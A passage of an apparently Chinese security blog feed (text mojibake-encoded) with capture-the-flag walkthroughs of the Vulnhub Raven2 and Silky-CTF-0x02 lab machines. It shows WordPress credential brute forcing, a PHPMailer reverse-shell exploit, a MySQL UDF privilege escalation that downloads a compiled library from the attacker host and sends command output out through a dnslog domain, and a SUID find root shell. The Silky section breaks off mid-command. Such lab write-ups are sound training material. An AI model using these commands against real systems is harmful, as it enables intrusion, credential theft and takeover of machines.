çš„æ¼æ´ï¼Œä¸è¿‡è¿™ä¸ªæ¼æ´åœ¨ä¸ªäººæ¸—é€è¿‡ç¨‹ä¸­èµ·åˆ°çš„ä½œç”¨å¾®ä¹ç”šå¾®ã€‚</p><h3 id="3ã€webç›®å½•æ¢æµ‹"><a href="#3ã€webç›®å½•æ¢æµ‹" class="headerlink" title="3ã€webç›®å½•æ¢æµ‹"></a>3ã€webç›®å½•æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.60 -x 404,403#è¿‡æ»¤404ã€403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205151054134.png" alt="image-20240205151054134"></p><p>çœ‹åˆ°æœ‰wordpressï¼Œç–‘ä¼¼wordpressæ­å»ºçš„åšå®¢ç½‘ç«™ã€‚</p><h3 id="4ã€webæ¡†æ¶æ¢æµ‹"><a href="#4ã€webæ¡†æ¶æ¢æµ‹" class="headerlink" title="4ã€webæ¡†æ¶æ¢æµ‹"></a>4ã€webæ¡†æ¶æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.60#åœ¨kaliä¸­ç”¨whatwebè¿›è¡Œè¯†åˆ«</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205151433137.png" alt="image-20240205151433137"></p><p>å¹¶æœªæ¢æµ‹åˆ°wordpressæ¡†æ¶ï¼Œé‚£æˆ‘ä»¬å»æ¢æµ‹wordpressè¿™ä¸ªè·¯å¾„</p><p><img src="/img/Vulnhub-Raven2/image-20240205151835831.png" alt="image-20240205151835831"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®šä½¿ç”¨äº†wordpressæ¡†æ¶ã€‚</p><h1 id="ä¸‰ã€è·å¾—shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å¾—shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å¾—shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å¾—shellç«‹è¶³ç‚¹</h1><h3 id="1ã€æ•æ„Ÿä¿¡æ¯æŸ¥çœ‹"><a href="#1ã€æ•æ„Ÿä¿¡æ¯æŸ¥çœ‹" class="headerlink" title="1ã€æ•æ„Ÿä¿¡æ¯æŸ¥çœ‹"></a>1ã€æ•æ„Ÿä¿¡æ¯æŸ¥çœ‹</h3><p>1ã€.DS_Storeæ–‡ä»¶ï¼šæ˜¯macOS æ“ä½œç³»ç»Ÿçš„æ–‡ä»¶ç±»å‹ã€‚å®ƒæ˜¯ç”± Finderï¼ˆMac ä¸Šçš„æ–‡ä»¶ç®¡ç†å™¨ï¼‰åˆ›å»ºçš„éšè—æ–‡ä»¶ï¼Œç”¨äºå­˜å‚¨æœ‰å…³ç‰¹å®šæ–‡ä»¶å¤¹çš„è§†å›¾é€‰é¡¹å’Œå…ƒæ•°æ®ã€‚</p><p>å¯ä»¥ç”¨GitHubçš„å·¥å…·å¯¹å…¶è¿›è¡Œè§£æï¼š<a href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python main.py .DS_Store</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205155926915.png" alt="image-20240205155926915"></p><p>å¹¶æ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯</p><h3 id="2ã€Vendorè·¯å¾„ä¿¡æ¯æ”¶é›†"><a href="#2ã€Vendorè·¯å¾„ä¿¡æ¯æ”¶é›†" class="headerlink" title="2ã€Vendorè·¯å¾„ä¿¡æ¯æ”¶é›†"></a>2ã€Vendorè·¯å¾„ä¿¡æ¯æ”¶é›†</h3><p>vendor&#x2F;PATHï¼šå‘ç°äº†ä¸€ä¸ªflag1</p><p><img src="/img/Vulnhub-Raven2/image-20240205160305176.png" alt="image-20240205160305176"></p><p>åœ¨&#x2F;vendor&#x2F;readme.mdä¸­å‘ç°PHPMailerï¼Œç™¾åº¦ç™¾ç§‘è§£é‡Šï¼šæ˜¯ä¸€ä¸ªç”¨äºå‘é€ç”µå­é‚®ä»¶çš„PHPå‡½æ•°åŒ…ã€‚ç›´æ¥ç”¨PHPå°±å¯ä»¥å‘é€ï¼Œæ— éœ€æ­å»ºå¤æ‚çš„EmailæœåŠ¡ã€‚ </p><p><img src="/img/Vulnhub-Raven2/image-20240205171224387.png" alt="image-20240205171224387"></p><p>&#x2F;vendor&#x2F;VERSIONå‘ç°ç‰ˆæœ¬ä¸º5.2.16</p><p><img src="/img/Vulnhub-Raven2/image-20240205171505826.png" alt="image-20240205171505826"></p><p>æœ‰å…³è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ä¹Ÿæœ‰å¾ˆå¤š</p><p><img src="/img/Vulnhub-Raven2/image-20240205171639908.png" alt="image-20240205171639908"></p><h3 id="3ã€wordressæ¡†æ¶ä¿¡æ¯æ”¶é›†"><a href="#3ã€wordressæ¡†æ¶ä¿¡æ¯æ”¶é›†" class="headerlink" title="3ã€wordressæ¡†æ¶ä¿¡æ¯æ”¶é›†"></a>3ã€wordressæ¡†æ¶ä¿¡æ¯æ”¶é›†</h3><p>ç»§ç»­å°†ç›®æ ‡è½¬ç§»è‡³ wordpressç›®å½•æ¡†æ¶ï¼Œå¯¹è¯¥ç›®å½•å†è¿›è¡Œä¸€æ¬¡ç›®å½•æ‰«æ</p><p><img src="/img/Vulnhub-Raven2/image-20240205160829021.png" alt="image-20240205160829021"></p><p>æˆ‘ä»¬è®¿é—®wp-adminçš„æ—¶å€™å‘ç”Ÿäº†é”™è¯¯ï¼š</p><p><img src="/img/Vulnhub-Raven2/image-20240205162944210.png" alt="image-20240205162944210"></p><p>ä¸€è€Œå†ä¸‰çš„ç¡®è®¤æ˜¯wordpress æ¡†æ¶ï¼Œè¿™é‡Œä¸åº”è¯¥æŠ¥é”™ï¼Œå¯èƒ½æ˜¯hostsè§£æã€‚</p><p>æˆ‘ä»¬æ‰“å¼€ç³»ç»Ÿç»„ä»¶ä¸­çš„hosts æ–‡ä»¶</p><p><img src="/img/Vulnhub-Raven2/image-20240205163105055.png" alt="image-20240205163105055"></p><p>æ·»åŠ å¦‚ä¸‹æœ¬åœ°hosts æ–‡ä»¶çš„IPè§£æ</p><p><img src="/img/Vulnhub-Raven2/image-20240205162546551.png" alt="image-20240205162546551"></p><p>é‡æ–°æ‰“å¼€å³å¯ã€‚</p><p><img src="/img/Vulnhub-Raven2/image-20240205163213369.png" alt="image-20240205163213369"></p><p>wp-content&#x2F;uploadsè·¯å¾„ä¸‹å‘ç°äº†flag3</p><p><img src="/img/Vulnhub-Raven2/image-20240205165525290.png" alt="image-20240205165525290"></p><h3 id="4ã€wordpressæ¡†æ¶åˆ©ç”¨å·¥å…·-wpscan"><a href="#4ã€wordpressæ¡†æ¶åˆ©ç”¨å·¥å…·-wpscan" class="headerlink" title="4ã€wordpressæ¡†æ¶åˆ©ç”¨å·¥å…·-wpscan"></a>4ã€wordpressæ¡†æ¶åˆ©ç”¨å·¥å…·-wpscan</h3><p>wpscanæ˜¯ä¸“é—¨é’ˆå¯¹wordpressåˆ©ç”¨çš„å·¥å…·ï¼š</p><p>1ã€ç”¨æˆ·åæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.60/wordpress/ --enumerate u</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205171928756.png" alt="image-20240205171928756"></p><p>æœ‰steven michaelä¸¤ä¸ªç”¨æˆ·ï¼Œå°†å…¶ä¿å­˜åœ¨user.txtæ–‡ä»¶ä¸­</p><p>2ã€è¿›è¡Œå¯†ç çˆ†ç ´</p><p>æˆ‘ä»¬å¯ä»¥ç”¨å¯†ç ç”Ÿæˆå·¥å…·cewl é’ˆå¯¹wordpressç”Ÿæˆä¸“é—¨çš„å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.31.60/wordpress/ -w pass.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205172053643.png" alt="image-20240205172053643"></p><p>ä¹‹ååœ¨è¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url &quot;http://192.168.31.60/wordpress/&quot; -P &quot;pass.txt&quot; --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205172154945.png" alt="image-20240205172154945"></p><p><img src="/img/Vulnhub-Raven2/image-20240205172249849.png" alt="image-20240205172249849"></p><p>ä¸ºäº†å¢åŠ çˆ†ç ´çš„æ¦‚ç‡ï¼Œæˆ‘åœ¨ç”¨æˆ·åä¸­å¢åŠ äº†adminã€rootä¸¤ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯ä¾ç„¶çˆ†ç ´å¤±è´¥ã€‚æˆ‘ä»¬å¯ä»¥ç”¨è‡ªå·±çš„å­—å…¸å¤šæ¬¡å°è¯•ã€‚ä»¥åŠåˆ©ç”¨wpscané’ˆå¯¹wordpress çš„ä¸»é¢˜å’Œæ’ä»¶æ¼æ´è¿›è¡Œæ‰«æåˆ©ç”¨ã€‚</p><h3 id="5ã€getshell"><a href="#5ã€getshell" class="headerlink" title="5ã€getshell"></a>5ã€getshell</h3><p>wordpressåˆ©ç”¨è¾ƒä¸ºå›°éš¾ï¼Œæˆ‘ä»¬å°†ç›®å…‰å†è½¬å‘PHPMailerã€‚</p><p>æˆ‘ä»¬ä¼˜å…ˆä½¿ç”¨å¦‚ä¸‹å‡ ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œè„šæœ¬</p><p><img src="/img/Vulnhub-Raven2/image-20240205172633118.png" alt="image-20240205172633118"></p><p>å°†å››ä¸ªè„šæœ¬å¤åˆ¶åˆ°æœ¬è·¯å¾„ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp php/webapps/40968.sh /c/Users/Administrator/Desktop/test/script/</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240205172851755.png" alt="image-20240205172851755"></p><p>åœ¨40974.pyä¸­ï¼Œæˆ‘ä»¬ä¿®æ”¹è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼ŒåŒæ—¶åœ¨æœ¬åœ°èµ·ä¸€ä¸ª4444çš„ç›‘å¬</p><p><img src="/img/Vulnhub-Raven2/image-20240205190108255.png" alt="image-20240205190108255"></p><p>ç„¶åæ‰§è¡Œè¯¥è„šæœ¬ï¼Œè®¿é—®contact.phpæ–‡ä»¶ï¼Œä¼šç”Ÿæˆshell.php æ–‡ä»¶ï¼Œå†…å®¹åˆ™æ˜¯åå¼¹shellï¼Œå†è®¿é—®shell.phpï¼Œåˆ™æ‹¿åˆ°shell</p><p><img src="/img/Vulnhub-Raven2/image-20240205190259052.png" alt="image-20240205190259052"></p><h1 id="å››ã€ææƒè‡³root"><a href="#å››ã€ææƒè‡³root" class="headerlink" title="å››ã€ææƒè‡³root"></a>å››ã€ææƒè‡³root</h1><h3 id="1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶"><a href="#1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶"></a>1ã€ç¿»æ‰¾æ•æ„Ÿæ–‡ä»¶</h3><p>1ã€æ•°æ®åº“çš„è´¦å·å¯†ç </p><p>æˆ‘ä»¬çŸ¥é“åœ¨wordpress æ¡†æ¶ä¸‹å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œåœ¨wp-config.php æ–‡ä»¶ä¸­</p><p><img src="/img/Vulnhub-Raven2/image-20240206133212310.png" alt="image-20240206133212310"></p><p>æ‹¿åˆ°MYSQL æ•°æ®åº“çš„è´¦å·å¯†ç ï¼šroot:R@v3nSecurity</p><p>è¿˜æ˜¯ä¸€ä¸ªé«˜æƒé™çš„è´¦å·å¯†ç ï¼Œå¯èƒ½å­˜åœ¨æ•°æ®åº“ææƒã€‚</p><p>2ã€&#x2F;etc&#x2F;passwdæ–‡ä»¶</p><p>æ‰¾åˆ°ä¸¤ä¸ªæ™®é€šç”¨æˆ·michaelã€steven</p><p>è¿™ä¸¤ä¸ªç”¨æˆ·åè·Ÿç”¨wpscanå·¥å…·æ‰«æå‡ºæ¥çš„wordpressç”¨æˆ·åä¸€æ ·ã€‚</p><p>3ã€&#x2F;home ç›®å½•</p><p>æ™®é€šç”¨æˆ·ç›®å½•ä¸‹ä¹Ÿä¸€æ— æ‰€è·</p><p><img src="/img/Vulnhub-Raven2/image-20240206133656277.png" alt="image-20240206133656277"></p><p>4ã€ç”¨find å‘½ä»¤æŸ¥æ‰¾é«˜æƒé™æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206134503358.png" alt="image-20240206134503358"></p><p>å¹¶æ²¡æœ‰æ‰¾åˆ°èƒ½ææƒçš„æ–‡ä»¶</p><h3 id="2ã€æ•°æ®åº“UDFææƒ"><a href="#2ã€æ•°æ®åº“UDFææƒ" class="headerlink" title="2ã€æ•°æ®åº“UDFææƒ"></a>2ã€æ•°æ®åº“UDFææƒ</h3><p>æˆ‘ä»¬æ­¤æ—¶æœ‰æ•°æ®åº“çš„é«˜æƒé™ç”¨æˆ·ï¼Œå¯ä»¥å°è¯•æ•°æ®åº“ææƒ</p><p>1ã€æˆ‘ä»¬å…ˆè¿›å…¥äº¤äº’å¼shellï¼Œç„¶åå†è¿›è¡Œæ•°æ®åº“è¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206135019626.png" alt="image-20240206135019626"></p><p>2ã€æŸ¥è¯¢æ˜¯å¦æ»¡è¶³UDFææƒæ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select user();</span><br><span class="line">select version();</span><br><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line">show variables like &#x27;plugin%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206135517495.png" alt="image-20240206135517495"></p><p>æ»¡è¶³æ‰€æœ‰æ¡ä»¶</p><p>3ã€æŸ¥æ‰¾udfææƒçš„è„šæœ¬å¹¶å¤åˆ¶åˆ°æœ¬ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd udf</span><br><span class="line">cp exploits/linux/local/1518.c /c/Users/Administrator/Desktop/test</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206141513845.png" alt="image-20240206141513845"></p><p><img src="/img/Vulnhub-Raven2/image-20240206141445761.png" alt="image-20240206141445761">4ã€åœ¨æœ¬åœ°è¿›è¡Œç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o 111.so 1518.o -lc</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206141905939.png" alt="image-20240206141905939"></p><p>5ã€ä¸Šä¼ è‡³é¶æœº&#x2F;tmpç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br><span class="line">#åœ¨é¶æœº</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.31.50:8000/111.so</span><br></pre></td></tr></table></figure><p>6ã€ä¹‹åæŒ‰ç…§udfææƒå§¿åŠ¿æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/111.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/111.so&#x27;;</span><br><span class="line">create function do_system returns integer soname &#x27;111.so&#x27;;</span><br><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure><p>7ã€åˆ©ç”¨dnslogå¹³å°è¿›è¡Œæµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸è¿›è¡Œdnslogå›æ˜¾ï¼Œç»“æœå°†æ˜¯å¦‚ä¸‹ï¼š</p><p><img src="/img/Vulnhub-Raven2/image-20240206151817786.png" alt="image-20240206151817786"></p><p>æˆ‘ä»¬åˆ©ç”¨dnslog å¹³å°è¿›è¡Œå›æ˜¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;ping -c 1 `whoami`.hhk1dh.dnslog.cn&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206152819346.png" alt="image-20240206152819346"><img src="/img/Vulnhub-Raven2/image-20240206152833163.png" alt="image-20240206152833163"></p><p><img src="/img/Vulnhub-Raven2/image-20240206152843521.png" alt="image-20240206152843521"></p><h3 id="3ã€è·å–rootæƒé™"><a href="#3ã€è·å–rootæƒé™" class="headerlink" title="3ã€è·å–rootæƒé™"></a>3ã€è·å–rootæƒé™</h3><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œæˆ‘ä»¬ç»™find å‘½ä»¤SUIDæƒé™ï¼Œç„¶åé€šè¿‡findè¿›è¡Œææƒ</p><p>1ã€ç¡®è®¤find çš„ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;ping -c 1 `which find`.hhk1dh.dnslog.cn&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206153227992.png" alt="image-20240206153227992"></p><p>2ã€ç»™find SUIDæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select do_system(&quot;chmod u+s /usr/bin/find&quot;);</span><br></pre></td></tr></table></figure><p>3ã€find å‘½ä»¤è¿›è¡Œææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Raven2/image-20240206154445556.png" alt="image-20240206154445556"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhub_Silky-CTF_0x02</title>
      <link href="/2024/02/17/Vulnhub-Silky-CTF-0x02/"/>
      <url>/2024/02/17/Vulnhub-Silky-CTF-0x02/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Silky-CTF-0x02-æ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Silky-CTF-0x02-æ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Silky-CTF_0x02 æ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Silky-CTF_0x02 æ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><p>ä»ç½‘ç›˜ä¸‹è½½è¯¥é¶æœºï¼Œåœ¨vmä¸­é€‰æ‹©ã€æ‰“å¼€ã€‘ï¼Œé€‰æ‹©â€œæˆ‘å·²å¤åˆ¶è¯¥è™šæ‹Ÿæœºâ€ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129150403292.png" alt="image-20240129150403292"></p><p>ç„¶åè®¾ç½®åç§°å’Œå­˜å‚¨è·¯å¾„ï¼Œé€‰æ‹©ã€é‡è¯•ã€‘å³å¯ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129150536282.png" alt="image-20240129150536282"></p><p>ä¹‹åé…ç½®é¶æœºçš„ç½‘ç»œè¿æ¥æ¨¡å¼ä¸ºã€NETã€‘æ¨¡å¼æ‰“å¼€ã€‚</p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><p>å…ˆæŸ¥çœ‹ä¸»æœºä¸»æœºçš„IPä¿¡æ¯ï¼Œå†é€šè¿‡nmapæ‰«æå­˜æ´»ä¸»æœºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn IP</span><br><span class="line">#å‘ç°ç›®æ ‡192.168.31.54</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129151155765.png" alt="image-20240129151155765"></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p>å¯¹ç›®æ ‡æœºå™¨çš„ç«¯å£è¿›è¡Œæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.54#å¿«é€Ÿç²—ç•¥æ‰«æ</span><br><span class="line">nmap.exe -p- -min-rate 1000 -sT 192.168.31.54#ä»¥1000é€Ÿç‡è¿›è¡ŒTCPè¯¦ç»†æ‰«æ</span><br><span class="line">nmap.exe -p- -min-rate 1000 -sU 192.168.31.54#ä»¥1000é€Ÿç‡è¿›è¡ŒUDPè¯¦ç»†æ‰«æ</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129151509326.png" alt="image-20240129151509326"></p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129152017366.png" alt="image-20240129152017366"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -Pn -p 22,80 192.168.31.54#å¯¹ç›®æ ‡å¼€æ”¾ç«¯å£åŠç³»ç»Ÿè¿›è¡Œè¯¦ç»†æ‰«æ</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129152728947.png" alt="image-20240129152728947"></p><p>ç›®æ ‡æ˜¯linux çš„Debianç³»ç»Ÿã€webé‡‡ç”¨apacheæœåŠ¡ã€‚</p><p>22ç«¯å£å¯ä»¥è¿›è¡Œçˆ†ç ´ï¼Œä½†æ˜¯ä½œä¸ºwebé¶åœºï¼Œæ˜¾ç„¶ä¸æ˜¯è®©æˆ‘ä»¬è¿™ä¹ˆåšï¼Œä½†æ˜¯ä¸å¦¨ç”¨å¦‚ä¸‹å°è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra.exe -L users.txt -P password.txt ssh://192.168.31.54#æˆ‘ä»¬éœ€è¦æä¾›è´¦å·å¯†ç çš„å­—å…¸å³å¯</span><br><span class="line">#æ­¤å¤„ä¸å»ºè®®è¿›è¡Œsshçˆ†ç ´ï¼Œæ€€ç–‘æœ‰è¢«å°IPçš„å¯èƒ½ã€‚</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹åªæ˜¯æä¾›äº†ç®€å•çš„è´¦å·å¯†ç å­—å…¸åšäº†æ¼”ç¤ºï¼Œå¹¶æœªçˆ†ç ´æˆåŠŸï¼š</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129153510803.png" alt="image-20240129153510803"></p><h3 id="3ã€webç›®å½•æ‰«æ"><a href="#3ã€webç›®å½•æ‰«æ" class="headerlink" title="3ã€webç›®å½•æ‰«æ"></a>3ã€webç›®å½•æ‰«æ</h3><p>æˆ‘ä»¬é‡‡ç”¨dirsearch è¿›è¡Œæ‰«ææ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.54</span><br><span class="line">dirsearch -u http://192.168.31.54 -x 404,403#å¯ä»¥è¿‡æ»¤404ï¼Œ403çš„å“åº”</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129152050952.png" alt="image-20240129152050952"></p><h3 id="4ã€è¯†åˆ«webæ¡†æ¶"><a href="#4ã€è¯†åˆ«webæ¡†æ¶" class="headerlink" title="4ã€è¯†åˆ«webæ¡†æ¶"></a>4ã€è¯†åˆ«webæ¡†æ¶</h3><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129153012108.png" alt="image-20240129153012108"></p><p>å¹¶æ— ä»»ä½•æ¡†æ¶</p><h1 id="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å–shellç«‹è¶³ç‚¹</h1><h3 id="1ã€è®¿é—®admin-phpæ–‡ä»¶"><a href="#1ã€è®¿é—®admin-phpæ–‡ä»¶" class="headerlink" title="1ã€è®¿é—®admin.phpæ–‡ä»¶"></a>1ã€è®¿é—®admin.phpæ–‡ä»¶</h3><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129153717863.png" alt="image-20240129153717863"></p><p>ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼šSQLæ³¨å…¥ã€‚æ€€ç–‘ï¼šä½†æ˜¯æˆ‘ä»¬åœ¨ç«¯å£æ‰«æä¸­å¹¶æœªæ¢æµ‹åˆ°3306ç­‰æ•°æ®åº“ç«¯å£çš„å­˜åœ¨ã€‚</p><p>å…ˆéšä¾¿è¾“å…¥è´¦å·å¯†ç ï¼ŒæŸ¥çœ‹é”™è¯¯ä¿¡æ¯ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129155018184.png" alt="image-20240129155018184"></p><p>å°è¯•SQLæ³¨å…¥ï¼Œå¹¶ç”¨sqlmap è¿›è¡Œæ¢æµ‹ã€‚å¯æ— è®ºå¦‚ä½•æ¢æµ‹ï¼Œç»“æœéƒ½æ˜¯å¤±è´¥çš„ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129160144688.png" alt="image-20240129160144688"></p><h3 id="2ã€å‘ç°æ¼æ´"><a href="#2ã€å‘ç°æ¼æ´" class="headerlink" title="2ã€å‘ç°æ¼æ´"></a>2ã€å‘ç°æ¼æ´</h3><p>è¯·å‡ºæˆ‘ä»¬çš„xrayï¼Œè¿›è¡Œè¢«åŠ¨æ‰«æï¼Œå‘ç°è¿™ä¸ªåœ°æ–¹æœç„¶å­˜åœ¨æ¼æ´ã€‚</p><p><img src="/img/Vulnhub-Silky-CTF-0x02/image-20240129160320766.png" alt="image-20240129160320766"></p><p>å‚æ•°usernameå­˜åœ¨CMDæ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>æˆ‘ä»¬ç”¨curlè¿›è¡ŒæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 